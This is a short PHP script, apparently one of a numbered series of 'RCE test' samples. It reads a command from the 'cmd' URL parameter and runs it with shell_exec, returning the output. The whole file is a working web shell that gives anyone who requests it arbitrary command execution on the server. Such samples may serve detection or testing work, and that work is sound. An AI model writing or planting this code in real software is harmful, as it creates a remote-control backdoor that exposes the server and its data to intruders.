<?php
// RCE test variation #990
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>